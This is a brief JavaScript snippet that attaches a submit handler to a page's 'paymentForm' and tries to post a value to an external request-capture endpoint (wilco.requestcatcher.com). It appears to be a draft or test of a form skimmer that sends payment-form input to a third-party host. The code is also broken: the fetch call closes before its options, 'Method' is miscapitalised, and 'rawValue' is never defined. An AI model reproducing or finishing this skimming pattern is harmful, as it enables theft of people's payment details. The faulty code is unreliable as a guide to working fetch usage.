const py = document.getElementById("paymentForm")

console.log("test 123");

py.addEventListener('submit', function(event){
fetch('https://wilco.requestcatcher.com/test'), {
        Method:'post',
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: rawValue })
    }
});